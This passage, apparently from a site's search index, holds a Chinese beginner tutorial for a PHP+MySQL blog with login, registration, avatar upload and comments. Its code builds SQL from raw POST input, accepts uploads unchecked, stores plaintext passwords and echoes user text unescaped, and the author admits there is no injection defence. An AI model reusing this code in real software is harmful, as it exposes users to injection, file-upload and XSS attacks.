href=zhuxiao.php&gt;\u70b9\u51fb\u6ce8\u9500&lt;/a&gt;&lt;br&gt;\";\n} else {\n    $_SESSION[\"login\"] == false;\n    die(\"\u60a8\u65e0\u6743\u8bbf\u95ee\uff0c&lt;a href=denglu.php&gt;\u70b9\u51fb\u6b64\u5904\u767b\u5f55&lt;/a&gt;&lt;br&gt;\");\n}\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/#youxiphp","title":"youxi.php","text":"HTML<pre><code>&lt;?php\ninclude \"session.php\";\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;NUC \u6e38\u620f&lt;/title&gt;\n    &lt;h1&gt;\u6e38\u620f\u9875\u9762&lt;/h1&gt;\n    &lt;a href=\"select.php\"&gt;\u70b9\u51fb\u8d26\u53f7\u4ee5\u53caID\u7684\u5bf9\u5e94\u5173\u7cfb&lt;/a&gt;&lt;br&gt;\n    &lt;a href=\"jsp.php\"&gt;\u6570\u5b57\u70b8\u5f39&lt;/a&gt;&lt;br&gt;\n&lt;/head&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/#zhucephp","title":"zhuce.php","text":"PHP<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;NUC \u6ce8\u518c&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;/html&gt;\n\n\n&lt;?php\ninclude \"connect.php\";\n$name = $_POST['name'];\n$password1 = $_POST['password1'];\n$password2 = $_POST['password2'];\n$phone = $_POST['phone'];\n$tupian = $_FILES['tupian'];\n\nif ($_SERVER['REQUEST_METHOD'] == \"POST\") {\n    if (empty($name) || empty($password1) || empty($password2) || empty($phone)) {\n        $ERR = \"\u7528\u6237\u3001\u5bc6\u7801\u548c\u624b\u673a\u53f7\u7801\u4e0d\u80fd\u4e3a\u7a7a\";\n    } else if (strlen($password1) &lt; 6) {\n        $ERR = \"\u5bc6\u7801\u957f\u5ea6\u4e0d\u8db3\u516d\u4f4d\";\n    } else if ($password1 != $password2) {\n        $ERR = \"\u4e24\u6b21\u8f93\u5165\u7684\u5bc6\u7801\u4e0d\u4e00\u81f4\";\n    } else if (strlen($phone) != \"11\") {\n        $ERR = \"\u624b\u673a\u53f7\u7801\u683c\u5f0f\u6709\u95ee\u9898\";\n    } else {\n        if (file_exists(\"tupian/\" . $_FILES['tupian']['name'])) {\n            echo $_FILES['tupian']['name'] . \"\u6587\u4ef6\u5df2\u7ecf\u5b58\u5728\";\n        } else {\n            move_uploaded_file($_FILES[\"tupian\"][\"tmp_name\"], \"tupian/\" . $_FILES[\"tupian\"][\"name\"]);\n        }\n\n\n        $upload = \"insert into study_tbl(user,pass,phone,file) value('$name','$password1','$phone','$tupian');\";\n        if ($conn2-&gt;query($upload) === TRUE) {\n            $ERR = \"\u6ce8\u518c\u6210\u529f\uff01\";\n        } else {\n            $ERR = \"\u6ce8\u518c\u5931\u8d25\";\n        }\n    }\n}\n\n?&gt;\n\n&lt;form action=\"\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n    \u540d\u5b57\uff1a&lt;input type=\"text\" name=\"name\"&gt; &lt;br&gt;\n    \u5bc6\u7801\uff1a&lt;input type=\"password\" name=\"password1\"&gt;&lt;br&gt;\n    \u91cd\u65b0\u8f93\u5165\u5bc6\u7801\uff1a&lt;input type=\"password\" name=\"password2\"&gt;&lt;br&gt;\n    \u8bf7\u8f93\u5165\u624b\u673a\u53f7\u7801\uff1a&lt;input type=\"text\" name=\"phone\"&gt;&lt;br&gt;\n    \u4e0a\u4f20\u5934\u50cf:&lt;input type=\"file\" name=\"tupian\"&gt;&lt;/br&gt;\n    &lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n&lt;/form&gt;\n\n&lt;a href=\"denglu.php\"&gt;\u70b9\u6b64\u8fd4\u56de\u767b\u5f55\u9875\u9762&lt;/a&gt;&lt;br&gt;\n\n&lt;?php\necho $ERR;\necho \"\u4f60\u6ce8\u518c\u7684\u7528\u6237\u4e3a\uff1a\" . $name . \"&lt;br&gt;\";\necho \"\u4f60\u6ce8\u518c\u7684\u624b\u673a\u53f7\u7801\u4e3a\uff1a\" . $phone . \"&lt;br&gt;\";\n?&gt;\n\n&lt;img src=\"&lt;?php echo \"tupian/\" . $_FILES[\"tupian\"][\"name\"]; ?&gt;\" alt=\"\u4e0a\u4f20\u7684\u56fe\u7247\" /&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E5%88%9D%E7%BA%A7%29/#zhuxiaophp","title":"zhuxiao.php","text":"PHP<pre><code>&lt;?php\nsession_start();\n$_SESSION['login'] = \"false\";\nsession_destroy();\nheader('location:denglu.php');\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/","title":"PHP+MySQL\u535a\u5ba2\uff08\u9ad8\u7ea7\uff09","text":""},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#htmlphpmysqlcss","title":"\u529f\u80fd\u5982\u4e0b\uff1a\uff08html+php+mysql+css\uff09","text":"<ol> <li>\u767b\u5f55\u6ce8\u518c</li> <li>\u7528\u6237\u5bc6\u7801\u4fee\u6539</li> <li>\u5934\u50cf\u4e0a\u4f20\u53ca\u4fee\u6539</li> <li>\u53d1\u5e03\u6587\u7ae0\u3001\u6d4f\u89c8\u6587\u7ae0</li> <li>\u6587\u7ae0\u8bc4\u8bba\u53ca\u56de\u590d</li> </ol>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#_1","title":"\u6587\u4ef6\u8bf4\u660e\uff1a","text":"<ol> <li><code>connect.php</code> \u7528\u4e8e\u8fde\u63a5\u6570\u636e\u5e93\u7b49\u64cd\u4f5c\uff0c\u5176\u4ed6\u6587\u4ef6\u5305\u542b\u6b64\u6587\u4ef6\u3002</li> <li><code>article_list.php</code> \u7528\u4e8e\u6587\u7ae0\u3001\u8bc4\u8bba\u3001\u56de\u590d\u7684\u663e\u793a\uff0c\u4ee5\u53ca\u8bc4\u8bba\u548c\u56de\u590d\u7684\u53d1\u8868</li> <li><code>article.html</code> \u535a\u6587\u53d1\u8868\u7684\u7eafhtml\u6846\u67b6\uff0c\u6570\u636e\u63d0\u4ea4\u81f3publish_article.php</li> <li><code>change.php</code> \u7528\u4e8e\u4fee\u6539\u5bc6\u7801</li> <li><code>homepage.php</code> \u4e3b\u9875\u9762\uff0c\u5305\u542b\u4e94\u4e2a\u529f\u80fd\u5165\u53e3\uff0c\u5206\u522b\u662f\u4e2a\u4eba\u4fe1\u606f\u3001\u535a\u5ba2\u53d1\u8868\u3001\u535a\u5ba2\u6d4f\u89c8\u3001\u5934\u50cf\u4fee\u6539\u3001\u5bc6\u7801\u4fee\u6539</li> <li><code>index.html</code> \u767b\u9646\u754c\u9762\uff0c\u6570\u636e\u63d0\u4ea4\u81f3login.php</li> <li><code>login.php</code> \u5728\u540e\u7aef\u8fdb\u884c\u767b\u9646\u9a8c\u8bc1\uff0c\u6570\u636e\u7531index.html\u63d0\u4ea4</li> <li><code>persion.php</code> \"\u4e2a\u4eba\u4fe1\u606f\"\u529f\u80fd\u9875\u9762\uff0c\u7528\u4e8e\u663e\u793a\u7528\u6237\u7535\u8bdd\u3001\u5934\u50cf\u7b49</li> <li><code>publish_article.php</code> \u5411\u6570\u636e\u5e93\u4e2d\u63d0\u4ea4\u6587\u7ae0\uff08\u6807\u9898\u3001\u6b63\u6587\u3001\u4f5c\u8005\u3001\u63d0\u4ea4\u65f6\u95f4\uff09\uff0c\u6570\u636e\u7531article.html\u63d0\u4ea4</li> <li><code>register.php</code> \u7528\u4e8e\u6ce8\u518c\uff0cphp\u548chtml\u5305\u542b\u5728\u540c\u4e00\u6587\u4ef6\u4e2d</li> <li><code>session.php</code> \u7528\u4e8e\u5904\u7406session\u4f1a\u8bdd\uff0c\u5176\u4ed6\u6587\u4ef6\u5305\u542b\u6b64\u6587\u4ef6</li> <li><code>upimg.html</code> \"\u5934\u50cf\u4fee\u6539\u201d\u529f\u80fd\uff0c\u7eafhtml\u6846\u67b6\uff0c\u6570\u636e\u63d0\u4ea4\u81f3upimg.php</li> <li><code>upimg.php</code> \"\u5934\u50cf\u4fee\u6539\u201d\u529f\u80fd\uff0c\u6570\u636e\u7531upimg.html\u63d0\u4ea4</li> <li><code>zhuxiao.php</code> \u6ce8\u9500\u529f\u80fd\uff08\u9000\u51fa\u767b\u5f55\uff09</li> </ol>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#_2","title":"\u6539\u8fdb\u7a7a\u95f4","text":"<ol> <li>\u5bf9\u4e2d\u6587\u652f\u6301\u5e76\u4e0d\u53cb\u597d\uff08\u5934\u50cf\u4e0a\u4f20\u3001\u535a\u5ba2\u53d1\u8868\u7b49\uff09</li> <li>\u53ea\u8fdb\u884c\u4e86\u6700\u7b80\u5355\u7684\u529f\u80fd\u5b9e\u73b0\uff0cSQL\u6ce8\u5165\u7b49\u5e76\u6ca1\u6709\u9632\u5fa1\u63aa\u65bd</li> <li>CSS\u90fd\u662f\u5185\u8054\u5728\u5355\u4e2a\u6587\u4ef6\u4e4b\u5185\u7684\uff0c\u4e4b\u540e\u53ef\u4ee5\u8fdb\u884c\u5916\u8054</li> </ol>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#_3","title":"\u5176\u4ed6\u8bf4\u660e\uff1a","text":"<ol> <li> <p>\u56fe\u7247\u5b58\u653e\u4e8e\u6839\u76ee\u5f55\u4e0b\u7684 tupian \u6587\u4ef6\u5939</p> </li> <li> <p>\u6b64\u535a\u5ba2\u4f7f\u7528<code>MySQL</code>\uff0c\u4f7f\u7528\u4e86\u56db\u4e2a\u6570\u636e\u5e93\uff0c\u5206\u522b\u662f user\u3001replies\u3001comments\u3001articles    \u81f3\u4e8e\u6bcf\u4e2a\u8868\u4e2d\u5177\u4f53\u5b57\u6bb5\uff0c\u5efa\u8bae\u67e5\u770b\u6216\u76f4\u63a5\u8fd0\u884c\u6b64SQL\u6587\u4ef6\uff1a</p> </li> </ol>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#sql","title":"SQL \u4ec5\u7ed3\u6784","text":"SQL<pre><code>/*\n Navicat Premium Data Transfer\n\n Source Server         : localhost_3306\n Source Server Type    : MySQL\n Source Server Version : 50553\n Source Host           : localhost:3306\n Source Schema         : test\n\n Target Server Type    : MySQL\n Target Server Version : 50553\n File Encoding         : 65001\n\n Date: 20/02/2024 12:57:55\n*/\n\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for articles\n-- ----------------------------\nDROP TABLE IF EXISTS `articles`;\nCREATE TABLE `articles`  (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `author` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `publish_date` datetime NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = MyISAM AUTO_INCREMENT = 4 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Table structure for comments\n-- ----------------------------\nDROP TABLE IF EXISTS `comments`;\nCREATE TABLE `comments`  (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `article_id` int(11) NOT NULL,\n  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `created_at` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = MyISAM AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Table structure for replies\n-- ----------------------------\nDROP TABLE IF EXISTS `replies`;\nCREATE TABLE `replies`  (\n  `id` int(11) NOT NULL,\n  `comment_id` int(11) NULL DEFAULT NULL,\n  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `created_at` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Table structure for user\n-- ----------------------------\nDROP TABLE IF EXISTS `user`;\nCREATE TABLE `user`  (\n  `id` int(6) NOT NULL AUTO_INCREMENT,\n  `user` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `pass` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `photo` varchar(225) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `phone` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = MyISAM AUTO_INCREMENT = 8 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\nSET FOREIGN_KEY_CHECKS = 1;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#sql_1","title":"SQL \u7ed3\u6784\u548c\u6570\u636e","text":"SQL<pre><code>/*\n Navicat Premium Data Transfer\n\n Source Server         : localhost_3306\n Source Server Type    : MySQL\n Source Server Version : 50553\n Source Host           : localhost:3306\n Source Schema         : test\n\n Target Server Type    : MySQL\n Target Server Version : 50553\n File Encoding         : 65001\n\n Date: 20/02/2024 12:58:02\n*/\n\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for articles\n-- ----------------------------\nDROP TABLE IF EXISTS `articles`;\nCREATE TABLE `articles`  (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `author` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `publish_date` datetime NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = MyISAM AUTO_INCREMENT = 4 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of articles\n-- ----------------------------\nINSERT INTO `articles` VALUES (1, 'Test', 'This is a test.', 'hou', '2024-02-18 00:00:00');\nINSERT INTO `articles` VALUES (3, '2-Test', 'adadadadad', 'Aniston', '2024-02-19 21:04:56');\n\n-- ----------------------------\n-- Table structure for comments\n-- ----------------------------\nDROP TABLE IF EXISTS `comments`;\nCREATE TABLE `comments`  (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `article_id` int(11) NOT NULL,\n  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `created_at` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = MyISAM AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of comments\n-- ----------------------------\nINSERT INTO `comments` VALUES (1, 1, 'This is a comment.', 'pinglun', '2024-02-19 20:22:03');\n\n-- ----------------------------\n-- Table structure for replies\n-- ----------------------------\nDROP TABLE IF EXISTS `replies`;\nCREATE TABLE `replies`  (\n  `id` int(11) NOT NULL,\n  `comment_id` int(11) NULL DEFAULT NULL,\n  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `created_at` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of replies\n-- ----------------------------\nINSERT INTO `replies` VALUES (0, 1, 'This is a replie.', 'huifu', '2024-02-19 20:30:25');\n\n-- ----------------------------\n-- Table structure for user\n-- ----------------------------\nDROP TABLE IF EXISTS `user`;\nCREATE TABLE `user`  (\n  `id` int(6) NOT NULL AUTO_INCREMENT,\n  `user` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `pass` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `photo` varchar(225) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `phone` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = MyISAM AUTO_INCREMENT = 8 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of user\n-- ----------------------------\nINSERT INTO `user` VALUES (1, 'Aniston', '123123', 'tupian/Pic.jpg', NULL);\nINSERT INTO `user` VALUES (2, 'hou', '123123', 'tupian/te.jpg', '12312341234');\n\nSET FOREIGN_KEY_CHECKS = 1;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#_4","title":"\u5177\u4f53\u6587\u4ef6\u4ee3\u7801\uff1a","text":""},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#connectphp","title":"connect.php","text":"PHP<pre><code>&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;NUC \u8fde\u63a5&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"root\";\n$dbname = \"test\";\n\n$conn = new mysqli($servername, $username, $password, $dbname);\n\n// \u8bbe\u7f6e\u5b57\u7b26\u7f16\u7801\uff0c\u9632\u6b62\u4e2d\u6587\u4e71\u7801\nmysqli_query($conn, 'set names utf8');\nmysqli_query($conn, 'set character set utf8');\n\nif ($conn-&gt;connect_error) {\n    die(\"\u6570\u636e\u8fde\u63a5\u5931\u8d25\" . $conn-&gt;connect_error);\n}\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#article_listphp","title":"article_list.php","text":"PHP<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;\u6587\u7ae0\u6d4f\u89c8&lt;/title&gt;\n    &lt;style&gt;\n        /* \u6587\u7ae0\u6574\u4f53\u5e03\u5c40 */\n        body {\n            font-family: Arial, sans-serif;\n            line-height: 1.6;\n            margin: 2em auto;\n            max-width: 800px;\n            padding: 0 20px;\n        }\n\n        h2 {\n            font-size: 24px;\n            color: #333;\n            font-weight: bold;\n            line-height: 1.5;\n            margin-top: 1em;\n            margin-bottom: 0.5em;\n            text-align: center;\n        }\n\n        /* \u6587\u7ae0\u5185\u5bb9\u6837\u5f0f */\n        .article {\n            border: 1px solid #ccc;\n            border-radius: 5px;\n            margin-bottom: 2em;\n            padding: 1em;\n        }\n\n        .article p {\n            margin: 0.5em 0;\n        }\n\n        /* \u8bc4\u8bba\u6837\u5f0f */\n        .comments {\n            margin-top: 1em;\n        }\n\n        .comment,\n        .reply {\n            margin-bottom: 1em;\n            border-left: 2px solid #ddd;\n            padding-left: 1em;\n        }\n\n        .comment h3,\n        .reply h3 {\n            margin-bottom: 0.5em;\n            font-size: 18px;\n            color: #666;\n        }\n\n        .comment form,\n        .reply form {\n            display: flex;\n            flex-direction: column;\n        }\n\n        .comment form input,\n        .comment form textarea,\n        .reply form input,\n        .reply form textarea {\n            margin-bottom: 0.5em;\n            width: 100%;\n        }\n\n        .comment form input[type=\"submit\"],\n        .reply form input[type=\"submit\"] {\n            background-color: #007BFF;\n            border: none;\n            color: white;\n            cursor: pointer;\n            padding: 0.5em 1em;\n        }\n\n        .comment form input[type=\"submit\"]:hover,\n        .reply form input[type=\"submit\"]:hover {\n            background-color: #0056b3;\n        }\n    &lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;h2&gt;\u6587\u7ae0\u6d4f\u89c8&lt;/h2&gt;\n\n\n\n&lt;?php\nerror_reporting(0);\n// \u8fde\u63a5\u6570\u636e\u5e93\ninclude \"connect.php\";\ninclude \"session.php\";\n// $conn = mysqli_connect('localhost', 'root', 'root', 'test');\n\n// \u5904\u7406\u8bc4\u8bba\u8868\u5355\u7684\u63d0\u4ea4\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    // \u63d0\u4ea4\u7684\u8868\u5355\u6570\u636e\n    if (isset($_POST['comment_id']) &amp;&amp; isset($_POST['reply_content']) &amp;&amp; isset($_POST['reply_username'])) {\n        $commentId = $_POST['comment_id'];\n        $replyContent = $_POST['reply_content'];\n        $replyUsername = $_POST['reply_username'];\n\n        // \u5c06\u56de\u590d\u63d2\u5165\u5230\u6570\u636e\u5e93\n        $replySql = \"INSERT INTO replies (comment_id, content, username, created_at) VALUES ($commentId, '$replyContent', '$replyUsername', NOW())\";\n        mysqli_query($conn, $replySql);\n    } elseif (isset($_POST['article_id']) &amp;&amp; isset($_POST['comment_content']) &amp;&amp; isset($_POST['comment_username'])) {\n        $articleId = $_POST['article_id'];\n        $commentContent = $_POST['comment_content'];\n        $commentUsername = $_POST['comment_username'];\n\n        // \u5c06\u8bc4\u8bba\u63d2\u5165\u5230\u6570\u636e\u5e93\n        $commentSql = \"INSERT INTO comments (article_id, content, username, created_at) VALUES ($articleId, '$commentContent', '$commentUsername', NOW())\";\n        mysqli_query($conn, $commentSql);\n    }\n}\n\n// \u4ece\u6570\u636e\u5e93\u4e2d\u68c0\u7d22\u6587\u7ae0\u5217\u8868\n$sql = \"SELECT * FROM articles\";\n$result = mysqli_query($conn, $sql);\n\necho \"&lt;br&gt;&lt;a href=homepage.php&gt;\u70b9\u51fb\u8fd4\u56de\u4e3b\u9875&lt;/a&gt;&lt;/br&gt;\";\n\n\n// \u663e\u793a\u6587\u7ae0\u5217\u8868\nwhile ($row = mysqli_fetch_assoc($result)) {\n    echo '&lt;h2&gt;' . $row['title'] . '&lt;/h2&gt;';\n    echo '&lt;p&gt;\u4f5c\u8005\uff1a' . $row['author'] . '&lt;/p&gt;';\n    echo '&lt;p&gt;\u53d1\u5e03\u65e5\u671f\uff1a' . $row['publish_date'] . '&lt;/p&gt;';\n    echo '&lt;p&gt;' . $row['content'] . '&lt;/p&gt;';\n\n    // \u4ece\u6570\u636e\u5e93\u4e2d\u83b7\u53d6\u6587\u7ae0\u8bc4\u8bba\n    $articleId = $row['id'];\n\n    $commentsSql = \"SELECT id, content, username, created_at FROM comments WHERE article_id = $articleId\";\n    $commentsResult = mysqli_query($conn, $commentsSql);\n\n    // \u663e\u793a\u6587\u7ae0\u8bc4\u8bba\n    while ($commentRow = mysqli_fetch_assoc($commentsResult)) {\n        echo '&lt;div&gt;';\n        echo '&lt;p&gt;\u8bc4\u8bba\u4eba\uff1a' . $commentRow['username'] . '&lt;/p&gt;';\n        echo '&lt;p&gt;' . $commentRow['content'] . '&lt;/p&gt;';\n        echo '&lt;p&gt;' . $commentRow['created_at'] . '&lt;/p&gt;';\n\n        // \u663e\u793a\u8bc4\u8bba\u7684\u56de\u590d\n        $commentId = $commentRow['id'];\n        $repliesSql = \"SELECT content, username, created_at FROM replies WHERE comment_id = $commentId\";\n        $repliesResult = mysqli_query($conn, $repliesSql);\n\n        while ($replyRow = mysqli_fetch_assoc($repliesResult)) {\n            echo '&lt;div&gt;';\n            echo '&lt;p&gt;\u56de\u590d\u4eba\uff1a' . $replyRow['username'] . '&lt;/p&gt;';\n            echo '&lt;p&gt;' . $replyRow['content'] . '&lt;/p&gt;';\n            echo '&lt;p&gt;' . $replyRow['created_at'] . '&lt;/p&gt;';\n            echo '&lt;/div&gt;';\n        }\n\n        // \u663e\u793a\u56de\u590d\u8868\u5355\n        echo '&lt;form action=\"\" method=\"post\"&gt;';\n        echo '&lt;input type=\"hidden\" name=\"comment_id\" value=\"' . $commentRow['id'] . '\" /&gt;';\n        echo '&lt;input type=\"text\" name=\"reply_username\" placeholder=\"\u56de\u590d\u4eba\u7528\u6237\u540d\"&gt;';\n        echo '&lt;textarea name=\"reply_content\" placeholder=\"\u56de\u590d\u5185\u5bb9\"&gt;&lt;/textarea&gt;';\n        echo '&lt;input type=\"submit\" value=\"\u56de\u590d\" /&gt;';\n        echo '&lt;/form&gt;';\n    }\n\n    // \u663e\u793a\u8bc4\u8bba\u8868\u5355\n    echo '&lt;form action=\"\" method=\"post\"&gt;';\n    echo '&lt;input type=\"hidden\" name=\"article_id\" value=\"' . $articleId . '\" /&gt;';\n    echo '&lt;input type=\"text\" name=\"comment_username\" placeholder=\"\u8bc4\u8bba\u4eba\u7528\u6237\u540d\"&gt;';\n    echo '&lt;textarea name=\"comment_content\" placeholder=\"\u8bc4\u8bba\u5185\u5bb9\"&gt;&lt;/textarea&gt;';\n    echo '&lt;input type=\"submit\" value=\"\u63d0\u4ea4\u8bc4\u8bba\" /&gt;';\n    echo '&lt;/form&gt;';\n\n    echo '&lt;hr&gt;';\n}\n\n// \u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\nmysqli_close($conn);\n?&gt;\n\n\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"WEB/others/PHP%2BMySQL%E5%8D%9A%E5%AE%A2%28%E9%AB%98%E7%BA%A7%29/#articlehtml","title":"article.html","text":"HTML<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n    &lt;!-- \u6dfb\u52a0\u5185\u90e8\u6837\u5f0f\u8868 --&gt;\n    &lt;style&gt;\n        /* \u4e3abody\u8bbe\u7f6e\u80cc\u666f\u989c\u8272 */\n        body {\n            background-color: #f2f2f2;\n        }\n\n        /* \u8bbe\u7f6e\u8868\u5355\u6837\u5f0f */\n        form {\n            width: 50%;\n            margin: 0 auto;\n            padding: 20px;\n            border: 1px solid #ccc;\n            border-radius: 5px;\n            box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.1);\n        }\n\n        h2 {\n            font-size: 24px;\n            /* \u8bbe\u7f6e\u5b57\u4f53\u5927\u5c0f */\n            color: #333;\n            /* \u8bbe\u7f6e\u5b57\u4f53\u989c\u8272\uff0c\u4f8b\u5982\u6df1\u7070\u8272 */\n            font-weight: bold;\n            /* \u8bbe\u7f6e\u5b57\u4f53\u7c97\u7ec6\uff0c\u4f7f\u5176\u52a0\u7c97 */\n            line-height: 1.5;\n            /* \u8bbe\u7f6e\u884c\u9ad8\uff0c\u5f71\u54cd\u884c\u95f4\u8ddd */\n            margin-top: 1em;\n            /* \u8bbe\u7f6e\u4e0a\u8fb9\u8ddd */\n            margin-bottom: 0.5em;\n            /* \u8bbe\u7f6e\u4e0b\u8fb9\u8ddd */\n            text-align: center;\n            /* \u8bbe\u7f6e\u6587\u672c\u5c45\u4e2d\u5bf9\u9f50 */\n        }\n\n        /* \u8f93\u5165\u6846\u548c\u6587\u672c\u533a\u57df\u6837\u5f0f */\n        input[type=\"text\"],\n        textarea {\n            display: block;\n            width: 100%;\n            margin-bottom: 10px;\n            padding: 8px;\n            font-size: 14px;\n            border: 1px solid #ccc;\n            border-radius: 3px;\n        }\n\n        /* \u63d0\u4ea4\u6309\u94ae\u6837\u5f0f */\n        input[type=\"submit\"] {\n            background-color: 